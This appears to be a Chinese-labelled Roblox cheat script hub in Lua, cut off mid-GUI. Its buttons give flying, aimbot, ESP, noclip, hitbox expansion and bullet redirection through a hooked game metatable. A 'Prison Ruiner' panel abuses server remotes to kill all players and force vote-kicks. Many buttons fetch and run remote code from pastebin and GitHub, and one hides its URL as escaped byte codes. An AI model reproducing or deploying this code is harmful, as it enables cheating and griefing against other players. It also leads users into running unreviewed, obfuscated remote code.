local CoreGui = game:GetService("StarterGui")
CoreGui:SetCore("SendNotification", {
    Title = "北极脚本",
    Text = ""..game.Players.LocalPlayer.Name.."脚本加载成功",
    Duration = 10
})

local library = loadstring(game:HttpGet('https://raw.githubusercontent.com/sharksharksharkshark/-/main/black%20ui.txt'))()
 
local Window = library:CreateWindow("鲨/凌工作室", "北极2", 10044538000)
 
local Tab = Window:CreateTab("感谢大家和小凌🥰")

local Page = Tab:CreateFrame("常用")

Button = Page:CreateButton("飞行", "你是小鸟吗?还会飞", function()
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\90\66\122\99\84\109\49\102\34\41\41\40\41\10")()
end)

Button = Page:CreateButton("强制自瞄", "不好用死了关不掉", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/1Gp9c57U"))()
end)

Button = Page:CreateButton("速度", "数值25", function()
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 25
end)

Button = Page:CreateButton("点击传送", "", function()
    mouse = game.Players.LocalPlayer:GetMouse() tool = Instance.new("Tool") tool.RequiresHandle = false tool.Name = "Equip to Click TP" tool.Activated:connect(function() local pos = mouse.Hit+Vector3.new(0,2.5,0) pos = CFrame.new(pos.X,pos.Y,pos.Z) game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos end) tool.Parent = game.Players.LocalPlayer.Backpack
end)

Button = Page:CreateButton("透视", "ESP", function()
    loadstring(game:GetObjects("rbxassetid://10092697033")[1].Source)()
end)

Button = Page:CreateButton("高画质", "wow好好看!", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/jHBfJYmS"))()
end)
 
local Page = Tab:CreateFrame("通用")

Button = Page:CreateButton("无限跳跃", "嗯?跳跳跳跳跳!", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/V5PQy3y0", true))()
end)

Button = Page:CreateButton("透视", "看到所有玩家", function()
    loadstring(game:GetObjects("rbxassetid://10092697033")[1].Source)()
end)

Button = Page:CreateButton("隐身道具", "别人看不见", function()
    loadstring(game:HttpGet("https://gist.githubusercontent.com/skid123skidlol/cd0d2dce51b3f20ad1aac941da06a1a1/raw/f58b98cce7d51e53ade94e7bb460e4f24fb7e0ff/%257BFE%257D%2520Invisible%2520Tool%2520(can%2520hold%2520tools)",true))()
end)

Button = Page:CreateButton("穿墙陀螺仪", "调到0可以穿墙", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/r97d7dS0', true))()
end)

Button = Page:CreateToggle("夜视", "可自由关闭", function(Value)
		if Value then
		    game.Lighting.Ambient = Color3.new(1, 1, 1)
		else
		    game.Lighting.Ambient = Color3.new(0, 0, 0)
		end
end)

Button = Page:CreateButton("速度和无限跳", "按e穿墙", function()
    local kavoUi = loadstring(game:HttpGet("https://pastebin.com/raw/vff1bQ9F"))()
local window = kavoUi.CreateLib("所有大亨通用脚本汉化版","BloodTheme")

---Tabs

local Tab1 = window:NewTab("首页")
local Tab1Section = Tab1:NewSection("首页")
local Tab2 = window:NewTab("开发&汉化")
local Tab2Section = Tab2:NewSection("Made By JN HH Gaming 汉化by:ZERO")
local Tab2Section = Tab2:NewSection("给JN HH GAMING点点关注")

---Buttons

Tab1Section:NewButton("攻击体积","修改攻击体积",function()
_G.HeadSize = 25
_G.Disabled = true

game:GetService('RunService').RenderStepped:connect(function()
if _G.Disabled then
for i,v in next, game:GetService('Players'):GetPlayers() do
if v.Name ~= game:GetService('Players').LocalPlayer.Name then
pcall(function()
v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
v.Character.HumanoidRootPart.Transparency = 0.7
v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really black")
v.Character.HumanoidRootPart.Material = "Neon"
v.Character.HumanoidRootPart.CanCollide = false
end)
end
end
end
end)
end)

Tab1Section:NewToggle("无限跳跃"," 我要飞的更高～",function()
local InfiniteJumpEnabled = true
game:GetService("UserInputService").JumpRequest:connect(function()
	if InfiniteJumpEnabled then
		game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
	end
end)
end)

Tab1Section:NewButton("速度","修改速度",function()
function isNumber(str)
  if tonumber(str) ~= nil or str == 'inf' then
    return true
  end
end
local tspeed = 1
local hb = game:GetService("RunService").Heartbeat
local tpwalking = true
local player = game:GetService("Players")
local lplr = player.LocalPlayer
local chr = lplr.Character
local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
while tpwalking and hb:Wait() and chr and hum and hum.Parent do
  if hum.MoveDirection.Magnitude > 0 then
    if tspeed and isNumber(tspeed) then
      chr:TranslateBy(hum.MoveDirection * tonumber(tspeed))
    else
      chr:TranslateBy(hum.MoveDirection)
    end
  end
end
end)

Tab1Section:NewButton("穿墙","老熟人不多介绍",function()
local StealthMode = true -- If game has an anticheat that checks the logs

local Indicator

if not StealthMode then
    local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
    print("穿墙: 电脑端按住键盘E")
    Indicator = Instance.new("TextLabel", ScreenGui)
    Indicator.AnchorPoint = Vector2.new(0, 1)
    Indicator.Position = UDim2.new(0, 0, 1, 0)
    Indicator.Size = UDim2.new(0, 200, 0, 50)
    Indicator.BackgroundTransparency = 1
    Indicator.TextScaled = true
    Indicator.TextStrokeTransparency = 0
    Indicator.TextColor3 = Color3.new(0, 0, 0)
    Indicator.TextStrokeColor3 = Color3.new(1, 1, 1)
    Indicator.Text = "穿墙:运行成功"
end

local noclip = false
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local mouse = player:GetMouse()

mouse.KeyDown:Connect(function(key)
    if key == "e" then
        noclip = not noclip

        if not StealthMode then
            Indicator.Text = "Noclip: " .. (noclip and "Enabled" or "Disabled")
        end
    end
end)

while true do
    player = game.Players.LocalPlayer
    character = player.Character

    if noclip then
        for _, v in pairs(character:GetDescendants()) do
            pcall(function()
                if v:IsA("BasePart") then
                    v.CanCollide = false
                end
            end)
        end
    end

    game:GetService("RunService").Stepped:wait()
end
end)
end)

Button = Page:CreateButton("传送", "传送观战", function()
    function GetPlayer(String)
   local Found = {}
   local strl = String:lower()
       for i,v in pairs(game.Players:GetPlayers()) do
           if v.Name:lower():sub(1, #String) == String:lower() then
               table.insert(Found,v.Name)
           end
       end    
   return Found    
end
local PrisonRuinerGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local Kill = Instance.new("TextButton")
local Merge = Instance.new("TextButton")
local Kick = Instance.new("TextButton")
local KillAll = Instance.new("TextButton")
local Sword = Instance.new("TextButton")
local Player = Instance.new("TextBox")
local TextLabel_2 = Instance.new("TextLabel")
local Line = Instance.new("TextLabel")
local Spectate = Instance.new("TextButton")
local Goto = Instance.new("TextButton")
local Unspectate = Instance.new("TextButton")
PrisonRuinerGui.Name = "监狱 Ruiner Gui"
PrisonRuinerGui.Parent = game.CoreGui
PrisonRuinerGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Frame.Active = true
Frame.Draggable = true
Frame.Parent = PrisonRuinerGui
Frame.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Frame.BorderColor3 = Color3.new(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.0496657118, 0, 0.473186165, 0)
Frame.Size = UDim2.new(0, 337, 0, 319)
TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.new(0.784314, 0.784314, 0.784314)
TextLabel.BorderColor3 = Color3.new(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Size = UDim2.new(0, 337, 0, 42)
TextLabel.Font = Enum.Font.Cartoon
TextLabel.Text = "监狱 Ruiner Gui"
TextLabel.TextColor3 = Color3.new(0.196078, 0.196078, 0.196078)
TextLabel.TextScaled = true
TextLabel.TextSize = 14
TextLabel.TextWrapped = true
Kill.Name = "杀"
Kill.Parent = Frame
Kill.BackgroundColor3 = Color3.new(0.784314, 0.784314, 0.784314)
Kill.BorderColor3 = Color3.new(0, 0, 0)
Kill.BorderSizePixel = 0
Kill.Position = UDim2.new(0.0579999983, 0, 0.173843265, 0)
Kill.Size = UDim2.new(0, 131, 0, 33)
Kill.Font = Enum.Font.Cartoon
Kill.Text = "杀"
Kill.TextColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Kill.TextScaled = true
Kill.TextSize = 14
Kill.TextWrapped = true
Merge.Name = "合并"
Merge.Parent = Frame
Merge.BackgroundColor3 = Color3.new(0.784314, 0.784314, 0.784314)
Merge.BorderColor3 = Color3.new(0, 0, 0)
Merge.BorderSizePixel = 0
Merge.Position = UDim2.new(0.550999999, 0, 0.173131928, 0)
Merge.Size = UDim2.new(0, 131, 0, 33)
Merge.Font = Enum.Font.Cartoon
Merge.Text = "合并"
Merge.TextColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Merge.TextScaled = true
Merge.TextSize = 14
Merge.TextWrapped = true
Kick.Name = "踢"
Kick.Parent = Frame
Kick.BackgroundColor3 = Color3.new(0.784314, 0.784314, 0.784314)
Kick.BorderColor3 = Color3.new(0, 0, 0)
Kick.BorderSizePixel = 0
Kick.Position = UDim2.new(0.0579999983, 0, 0.300999999, 0)
Kick.Size = UDim2.new(0, 131, 0, 33)
Kick.Font = Enum.Font.Cartoon
Kick.Text = "踢"
Kick.TextColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Kick.TextScaled = true
Kick.TextSize = 14
Kick.TextWrapped = true
KillAll.Name = "杀死所有人"
KillAll.Parent = Frame
KillAll.BackgroundColor3 = Color3.new(0.784314, 0.784314, 0.784314)
KillAll.BorderColor3 = Color3.new(0, 0, 0)
KillAll.BorderSizePixel = 0
KillAll.Position = UDim2.new(0.550999999, 0, 0.302032351, 0)
KillAll.Size = UDim2.new(0, 131, 0, 33)
KillAll.Font = Enum.Font.Cartoon
KillAll.Text = "杀死所有人"
KillAll.TextColor3 = Color3.new(0.196078, 0.196078, 0.196078)
KillAll.TextScaled = true
KillAll.TextSize = 14
KillAll.TextWrapped = true
Sword.Name = "剑"
Sword.Parent = Frame
Sword.BackgroundColor3 = Color3.new(0.784314, 0.784314, 0.784314)
Sword.BorderColor3 = Color3.new(0, 0, 0)
Sword.BorderSizePixel = 0
Sword.Position = UDim2.new(0.0579999685, 0, 0.855558157, 0)
Sword.Size = UDim2.new(0, 131, 0, 33)
Sword.Font = Enum.Font.Cartoon
Sword.Text = "剑"
Sword.TextColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Sword.TextScaled = true
Sword.TextSize = 14
Sword.TextWrapped = true
Player.Name = "玩家"
Player.Parent = Frame
Player.BackgroundColor3 = Color3.new(0.784314, 0.784314, 0.784314)
Player.BorderColor3 = Color3.new(0, 0, 0)
Player.BorderSizePixel = 0
Player.Position = UDim2.new(0.202000022, 0, 0.609539211, 0)
Player.Size = UDim2.new(0, 200, 0, 33)
Player.Font = Enum.Font.Cartoon
Player.PlaceholderColor3 = Color3.new(0.490196, 0.490196, 0.490196)
Player.PlaceholderText = "Player"
Player.Text = ""
Player.TextColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Player.TextScaled = true
Player.TextSize = 14
Player.TextWrapped = true
TextLabel_2.Parent = Frame
TextLabel_2.BackgroundColor3 = Color3.new(0.784314, 0.784314, 0.784314)
TextLabel_2.BorderColor3 = Color3.new(0, 0, 0)
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(0.855000019, 0, 0.654999971, 0)
TextLabel_2.Size = UDim2.new(0, 49, 0, 40)
TextLabel_2.Font = Enum.Font.Cartoon
TextLabel_2.Text = "Gui by Uctron"
TextLabel_2.TextColor3 = Color3.new(0.196078, 0.196078, 0.196078)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14
TextLabel_2.TextWrapped = true
Line.Name = "线"
Line.Parent = Frame
Line.BackgroundColor3 = Color3.new(0.784314, 0.784314, 0.784314)
Line.BorderColor3 = Color3.new(0, 0, 0)
Line.BorderSizePixel = 0
Line.Position = UDim2.new(0, 0, 0.78076911, 0)
Line.Size = UDim2.new(0, 337, 0, 10)
Line.Font = Enum.Font.Cartoon
Line.Text = ""
Line.TextColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Line.TextScaled = true
Line.TextSize = 14
Line.TextWrapped = true
Spectate.Name = "注意"
Spectate.Parent = Frame
Spectate.BackgroundColor3 = Color3.new(0.784314, 0.784314, 0.784314)
Spectate.BorderColor3 = Color3.new(0, 0, 0)
Spectate.BorderSizePixel = 0
Spectate.Position = UDim2.new(0.0579999983, 0, 0.42899999, 0)
Spectate.Size = UDim2.new(0, 131, 0, 33)
Spectate.Font = Enum.Font.Cartoon
Spectate.Text = "注意"
Spectate.TextColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Spectate.TextScaled = true
Spectate.TextSize = 14
Spectate.TextWrapped = true
Goto.Name = "去"
Goto.Parent = Frame
Goto.BackgroundColor3 = Color3.new(0.784314, 0.784314, 0.784314)
Goto.BorderColor3 = Color3.new(0, 0, 0)
Goto.BorderSizePixel = 0
Goto.Position = UDim2.new(0.551999986, 0, 0.430999994, 0)
Goto.Size = UDim2.new(0, 131, 0, 33)
Goto.Font = Enum.Font.Cartoon
Goto.Text = "去"
Goto.TextColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Goto.TextScaled = true
Goto.TextSize = 14
Goto.TextWrapped = true
Unspectate.Name = "不受欢迎"
Unspectate.Parent = Frame
Unspectate.BackgroundColor3 = Color3.new(0.784314, 0.784314, 0.784314)
Unspectate.BorderColor3 = Color3.new(0, 0, 0)
Unspectate.BorderSizePixel = 0
Unspectate.Position = UDim2.new(0.550581574, 0, 0.855558157, 0)
Unspectate.Size = UDim2.new(0, 131, 0, 33)
Unspectate.Font = Enum.Font.Cartoon
Unspectate.Text = "不受欢迎"
Unspectate.TextColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Unspectate.TextScaled = true
Unspectate.TextSize = 14
Unspectate.TextWrapped = true

Kill.MouseButton1Click:Connect(function()
local savedteam = game.Players.LocalPlayer.TeamColor.Name
workspace.Remote.TeamEvent:FireServer("Medium stone grey")
workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)	
for i,v in pairs(GetPlayer(Player.Text)) do
local A_1 = {[1] = {["RayObject"] = Ray.new(Vector3.new(845.555908, 101.429337, 2269.43945), Vector3.new(-391.152252, 8.65560055, -83.2166901)), ["Distance"] = 3.2524313926697, ["Cframe"] = CFrame.new(840.310791, 101.334137, 2267.87988, 0.0636406094, 0.151434347, -0.986416459, 0, 0.988420188, 0.151741937, 0.997972965, -0.00965694897, 0.0629036576), ["Hit"] = game.Players[v].Character.Head}, [2] = {["RayObject"] = Ray.new(Vector3.new(845.555908, 101.429337, 2269.43945), Vector3.new(-392.481476, -8.44939327, -76.7261353)), ["Distance"] = 3.2699294090271, ["Cframe"] = CFrame.new(840.290466, 101.184189, 2267.93506, 0.0964837447, 0.0589403138, -0.993587971, 4.65661287e-10, 0.998245299, 0.0592165813, 0.995334625, -0.00571343815, 0.0963144377), ["Hit"] = game.Players[v].Character.Head}, [3] = {["RayObject"] = Ray.new(Vector3.new(845.555908, 101.429337, 2269.43945), Vector3.new(-389.21701, -2.50536323, -92.2163162)), ["Distance"] = 3.1665518283844, ["Cframe"] = CFrame.new(840.338867, 101.236496, 2267.80371, 0.0166504811, 0.0941716284, -0.995416701, 1.16415322e-10, 0.995554805, 0.0941846818, 0.999861419, -0.00156822044, 0.0165764652), ["Hit"] = game.Players[v].Character.Head}, [4] = {["RayObject"] = Ray.new(Vector3.new(845.555908, 101.429337, 2269.43945), Vector3.new(-393.353973, 3.13988972, -72.5452042)), ["Distance"] = 3.3218522071838, ["Cframe"] = CFrame.new(840.277222, 101.285957, 2267.9707, 0.117109694, 0.118740402, -0.985994935, -1.86264515e-09, 0.992826641, 0.119563118, 0.993119001, -0.0140019981, 0.116269611), ["Hit"] = game.Players[v].Character.Head}, [5] = {["RayObject"] = Ray.new(Vector3.new(845.555908, 101.429337, 2269.43945), Vector3.new(-390.73172, 3.2097764, -85.5477524)), ["Distance"] = 3.222757101059, ["Cframe"] = CFrame.new(840.317993, 101.286423, 2267.86035, 0.0517584644, 0.123365127, -0.991010666, 0, 0.992340803, 0.123530701, 0.99865967, -0.00639375951, 0.0513620302), ["Hit"] = game.Players[v].Character.Head}}
local A_2 = game.Players.LocalPlayer.Backpack["Remington 870"]
local Event = game:GetService("ReplicatedStorage").ShootEvent
Event:FireServer(A_1, A_2)
Event:FireServer(A_1, A_2)
end
workspace.Remote.TeamEvent:FireServer(savedteam)
end)

KillAll.MouseButton1Click:Connect(function()
local savedteam = game.Players.LocalPlayer.TeamColor.Name
workspace.Remote.TeamEvent:FireServer("Medium stone grey")
workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)	
for i,v in pairs(game.Players:GetPlayers()) do
local A_1 = {[1] = {["RayObject"] = Ray.new(Vector3.new(845.555908, 101.429337, 2269.43945), Vector3.new(-391.152252, 8.65560055, -83.2166901)), ["Distance"] = 3.2524313926697, ["Cframe"] = CFrame.new(840.310791, 101.334137, 2267.87988, 0.0636406094, 0.151434347, -0.986416459, 0, 0.988420188, 0.151741937, 0.997972965, -0.00965694897, 0.0629036576), ["Hit"] = v.Character.Head}, [2] = {["RayObject"] = Ray.new(Vector3.new(845.555908, 101.429337, 2269.43945), Vector3.new(-392.481476, -8.44939327, -76.7261353)), ["Distance"] = 3.2699294090271, ["Cframe"] = CFrame.new(840.290466, 101.184189, 2267.93506, 0.0964837447, 0.0589403138, -0.993587971, 4.65661287e-10, 0.998245299, 0.0592165813, 0.995334625, -0.00571343815, 0.0963144377), ["Hit"] = v.Character.Head}, [3] = {["RayObject"] = Ray.new(Vector3.new(845.555908, 101.429337, 2269.43945), Vector3.new(-389.21701, -2.50536323, -92.2163162)), ["Distance"] = 3.1665518283844, ["Cframe"] = CFrame.new(840.338867, 101.236496, 2267.80371, 0.0166504811, 0.0941716284, -0.995416701, 1.16415322e-10, 0.995554805, 0.0941846818, 0.999861419, -0.00156822044, 0.0165764652), ["Hit"] = v.Character.Head}, [4] = {["RayObject"] = Ray.new(Vector3.new(845.555908, 101.429337, 2269.43945), Vector3.new(-393.353973, 3.13988972, -72.5452042)), ["Distance"] = 3.3218522071838, ["Cframe"] = CFrame.new(840.277222, 101.285957, 2267.9707, 0.117109694, 0.118740402, -0.985994935, -1.86264515e-09, 0.992826641, 0.119563118, 0.993119001, -0.0140019981, 0.116269611), ["Hit"] = v.Character.Head}, [5] = {["RayObject"] = Ray.new(Vector3.new(845.555908, 101.429337, 2269.43945), Vector3.new(-390.73172, 3.2097764, -85.5477524)), ["Distance"] = 3.222757101059, ["Cframe"] = CFrame.new(840.317993, 101.286423, 2267.86035, 0.0517584644, 0.123365127, -0.991010666, 0, 0.992340803, 0.123530701, 0.99865967, -0.00639375951, 0.0513620302), ["Hit"] = v.Character.Head}}
local A_2 = game.Players.LocalPlayer.Backpack["Remington 870"]
local Event = game:GetService("ReplicatedStorage").ShootEvent
Event:FireServer(A_1, A_2)
Event:FireServer(A_1, A_2)
end
game.Players.LocalPlayer.Character:BreakJoints()
workspace.Remote.TeamEvent:FireServer(savedteam)
end)

Merge.MouseButton1Click:Connect(function()
for i,v in pairs(GetPlayer(Player.Text)) do
repeat
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[v].Character.HumanoidRootPart.CFrame
game:GetService("RunService").Heartbeat:Wait()
until game.Players.LocalPlayer.Character.Humanoid.Health == 0
end
end)

Kick.MouseButton1Click:Connect(function()
for i,v in pairs(GetPlayer(Player.Text)) do
workspace.Remote.loadchar:InvokeServer(game.Players.LocalPlayer,game.Players[v].TeamColor.Name)
wait(.1)
game:GetService("StarterGui"):SetCore("SendNotification", {
Title = "Starting...";
Text = "Now attempting to kick "..v;
Duration = 5;
})
for i=1,10 do
workspace.Remote.votekick:InvokeServer("Start",game.Players[v])
workspace.Remote.votekick:InvokeServer("Vote")
game:GetService("RunService").Stepped:Wait()
end
if not game.Players:FindFirstChild(v) then
game:GetService("StarterGui"):SetCore("SendNotification", {
Title = "Success!";
Text = v.." has been kicked.";
Duration = 5;
})
end
end
end)

Spectate.MouseButton1Click:Connect(function()
for i,v in pairs(GetPlayer(Player.Text)) do
workspace.CurrentCamera.CameraSubject = game.Players[v].Character.Humanoid
end
end)

Goto.MouseButton1Click:Connect(function()
for i,v in pairs(GetPlayer(Player.Text)) do
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[v].Character.HumanoidRootPart.CFrame
end
end)

Unspectate.MouseButton1Click:Connect(function()
for i,v in pairs(GetPlayer(Player.Text)) do
workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
end
end)

Sword.MouseButton1Click:Connect(function()
for i,v in pairs(GetPlayer(Player.Text)) do
local Sword = Instance.new("Tool")
local Handle = Instance.new("Part")
local Mesh = Instance.new("SpecialMesh")
local Unsheath = Instance.new("Sound")
local SwordSlash = Instance.new("Sound")
SwordSlash.Name = "剑"
Unsheath.Name = "Unsheath"
Unsheath.SoundId = "http://www.roblox.com/asset/?id=12222225"
Unsheath.Volume = 1
SwordSlash.SoundId = "http://www.roblox.com/asset/?id=12222216"
SwordSlash.Volume = .7
Unsheath.Parent = Handle
SwordSlash.Parent = Handle
Mesh.Parent = Handle
Mesh.MeshId = "rbxassetid://497078148"
Mesh.Scale = Vector3.new(5,5,5)
Handle.Name = "处理"
Handle.Parent = Sword
Sword.GripForward = Vector3.new(-1,0,0)
Sword.GripPos = Vector3.new(0,0,-1.5)
Sword.GripRight = Vector3.new(0,1,0)
Sword.GripUp = Vector3.new(0,0,1)
Sword.ToolTip = "Uctron's Sword"
Sword.TextureId = "rbxasset://Textures/Sword128.png"
Sword.CanBeDropped = false
Sword.RequiresHandle = true
Handle.Orientation = Vector3.new(-46.24, 42.14, 50.93)
Handle.Position = Vector3.new(-3.174,1.57,3.04)
Handle.CanCollide = true
Handle.Size = Vector3.new(1,.8,4)
Mesh.MeshId = "rbxasset://fonts/sword.mesh"
Mesh.MeshType = "FileMesh"
Mesh.Offset = Vector3.new(0,0,0)
Mesh.Scale = Vector3.new(1,1,1)
Mesh.TextureId = "rbxasset://textures/SwordTexture.png"
Sword.Equipped:Connect(function()
Unsheath:Play()
end)
Sword.Activated:Connect(function()
SwordSlash:Play()
Handle.Touched:Connect(function(Handle)
p=game.Players:FindFirstChild(Handle.Parent.Name)
game.ReplicatedStorage.meleeEvent:FireServer(p)
end)
local Anim = Instance.new("StringValue")
Anim.Name = "工具"
Anim.Value = "Slash"
Anim.Parent = Sword
end)
Mouse_Icon = "rbxasset://textures/GunCursor.png"
Reloading_Icon = "rbxasset://textures/GunWaitCursor.png"
Tool = Sword
Mouse = nil
function UpdateIcon()
if Mouse then
Mouse.Icon = Tool.Enabled and Mouse_Icon or Reloading_Icon
end
end
function OnEquipped(ToolMouse)
Mouse = ToolMouse
UpdateIcon()
end
function OnChanged(Property)
if Property == "Enabled" then
UpdateIcon()
end
end
Tool.Equipped:Connect(OnEquipped)
Tool.Changed:Connect(OnChanged)
Sword.Parent = game.Players.LocalPlayer.Backpack
end
end)
end)

Button = Page:CreateButton("子弹追踪", "部分游戏不通用", function()
    local Camera = game:GetService("Workspace").CurrentCamera
local Players = game:GetService("Players")
local LocalPlayer = game:GetService("Players").LocalPlayer

local function GetClosestPlayer()
   local ClosestPlayer = nil
   local FarthestDistance = math.huge

   for i, v in pairs(Players.GetPlayers(Players)) do
       if v ~= LocalPlayer and v.Character and v.Character.FindFirstChild(v.Character, "HumanoidRootPart") then
           local DistanceFromPlayer = (LocalPlayer.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).Magnitude

           if DistanceFromPlayer < FarthestDistance then
               FarthestDistance = DistanceFromPlayer
               ClosestPlayer = v
           end
       end
   end

   if ClosestPlayer then
       return ClosestPlayer
   end
end

local GameMetaTable = getrawmetatable(game)
local OldGameMetaTableNamecall = GameMetaTable.__namecall
setreadonly(GameMetaTable, false)

GameMetaTable.__namecall = newcclosure(function(object, ...)
   local NamecallMethod = getnamecallmethod()
   local Arguments = {...}

   if tostring(NamecallMethod) == "FindPartOnRayWithIgnoreList" then
       local ClosestPlayer = GetClosestPlayer()
       
       if ClosestPlayer and ClosestPlayer.Character then
           Arguments[1] = Ray.new(Camera.CFrame.Position, (ClosestPlayer.Character.Head.Position - Camera.CFrame.Position).Unit * (Camera.CFrame.Position - ClosestPlayer.Character.Head.Position).Magnitude)
       end
   end

   return OldGameMetaTableNamecall(object, unpack(Arguments))
end)

setreadonly(GameMetaTable, true)
end)

Button = Page:CreateButton("蜘蛛爬行", "反重力", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))()
end)

Button = Page:CreateButton("变黑色恶魔", "...", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/tTyiBiqe",true))()
end)

Button = Page:CreateButton("动作包", "别人可见", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Animation-Hub/main/Animation%20Gui", true))()
end)

Button = Page:CreateButton("空中行走", "用一会会变开始卡", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Float'))()
end)

Button = Page:CreateButton("透视", "远距离透视", function()
    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/OwlHub.txt"))()
end)

Button = Page:CreateButton("自定义范围", "你没看错", function()
    -- Gui to Lua
-- Version: 3.2

-- Instances:

local Close = Instance.new("TextButton")
local Open2 = Instance.new("ScreenGui")
local Open = Instance.new("TextButton")
local FightingGui = Instance.new("ScreenGui")
local main = Instance.new("Frame")
local Cre = Instance.new("TextLabel")
local HitBox = Instance.new("TextBox")
local Red = Instance.new("TextBox")
local Green = Instance.new("TextBox")
local Blue = Instance.new("TextBox")
local TextLabel = Instance.new("TextLabel")

--Properties:

FightingGui.Name = "FightingGui"
FightingGui.Parent = game.CoreGui
FightingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling


Open2.Name = "Tools"
Open2.Parent = game.CoreGui
Open2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Open.Name = "打开"
Open.Parent = Open2
Open.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Open.Position = UDim2.new(0, 0, 0.451871663, 0)
Open.Size = UDim2.new(0, 78, 0, 50)
Open.Font = Enum.Font.SourceSans
Open.Text = "打开"
Open.TextColor3 = Color3.fromRGB(250, 0, 0)
Open.TextScaled = true
Open.TextSize = 14.000
Open.TextWrapped = true
Open.MouseButton1Down:Connect(function()
	FightingGui.Enabled = true
end)

Close.Name = "Close"
Close.Parent = main
Close.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Close.Position = UDim2.new(1, 0, -0.226244345, 0)
Close.Size = UDim2.new(0, 60, 0, 50)
Close.Font = Enum.Font.SourceSans
Close.Text = "X"
Close.TextColor3 = Color3.fromRGB(0, 0, 0)
Close.TextScaled = true
Close.TextSize = 14.000
Close.TextWrapped = true
Close.MouseButton1Down:Connect(function()
	FightingGui.Enabled = false
end)

main.Parent = FightingGui
main.Active = true
main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
main.Position = UDim2.new(0.073011741, 0, 0.237333342, 0)
main.Size = UDim2.new(0, 273, 0, 221)
main.Draggable = true

Cre.Name = "Cre"
Cre.Parent = main
Cre.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Cre.Position = UDim2.new(0, 0, -0.226244345, 0)
Cre.Size = UDim2.new(0, 273, 0, 50)
Cre.Font = Enum.Font.SourceSans
Cre.Text = "攻击范围脚本61汉化"
Cre.TextColor3 = Color3.fromRGB(0, 0, 0)
Cre.TextScaled = true
Cre.TextSize = 14.000
Cre.TextWrapped = true

HitBox.Name = "选择"
HitBox.Parent = main
HitBox.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
HitBox.Position = UDim2.new(0.0586080588, 0, 0.0995475128, 0)
HitBox.Size = UDim2.new(0, 65, 0, 50)
HitBox.Font = Enum.Font.SourceSans
HitBox.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
HitBox.PlaceholderText = "选择"
HitBox.Text = ""
HitBox.TextColor3 = Color3.fromRGB(0, 0, 0)
HitBox.TextScaled = true
HitBox.TextSize = 14.000
HitBox.TextWrapped = true

Red.Name = "Red"
Red.Parent = main
Red.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Red.Position = UDim2.new(0.485832304, 0, 0.0995475128, 0)
Red.Size = UDim2.new(0, 37, 0, 31)
Red.Font = Enum.Font.SourceSans
Red.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
Red.PlaceholderText = "红色"
Red.Text = ""
Red.TextColor3 = Color3.fromRGB(0, 0, 0)
Red.TextSize = 14.000

Green.Name = "绿色"
Green.Parent = main
Green.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
Green.Position = UDim2.new(0.665319502, 0, 0.0995475128, 0)
Green.Size = UDim2.new(0, 37, 0, 31)
Green.Font = Enum.Font.SourceSans
Green.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
Green.PlaceholderText = "绿色"
Green.Text = ""
Green.TextColor3 = Color3.fromRGB(0, 0, 0)
Green.TextSize = 14.000

TextLabel.Parent = main
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
TextLabel.Position = UDim2.new(0.47118023, 0, 0.325791866, 0)
TextLabel.Size = UDim2.new(0, 140, 0, 37)
